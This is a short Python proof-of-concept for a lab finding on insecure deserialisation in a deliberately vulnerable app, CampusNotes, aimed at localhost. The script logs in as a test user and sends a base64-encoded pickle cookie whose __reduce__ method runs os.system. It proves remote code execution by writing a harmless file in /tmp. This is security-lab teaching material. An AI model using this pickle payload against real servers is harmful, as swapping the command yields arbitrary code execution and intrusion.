"""
Proof of concept for finding V-07 (insecure deserialisation) in the
VULNERABLE CampusNotes app. Lab use only, against your own localhost copy.

It logs in as bob, then sends a 'prefs' cookie containing a pickled object.
When the server unpickles it, it runs a harmless command that creates
/tmp/campusnotes_pwned.txt, proving remote code execution.
"""
import base64
import os
import pickle

import requests

BASE = "http://127.0.0.1:5000"
PROOF = "/tmp/campusnotes_pwned.txt"


class Payload:
    def __reduce__(self):
        return (os.system, (f"echo 'RCE via pickle cookie' > {PROOF}",))


s = requests.Session()
s.post(f"{BASE}/login", data={"username": "bob", "password": "qwerty"})
cookie = base64.b64encode(pickle.dumps(Payload())).decode()
print("[*] Malicious prefs cookie:", cookie[:60] + "...")
s.get(f"{BASE}/", cookies={"prefs": cookie})
print("[+] Request sent. Check the server with:  cat", PROOF)
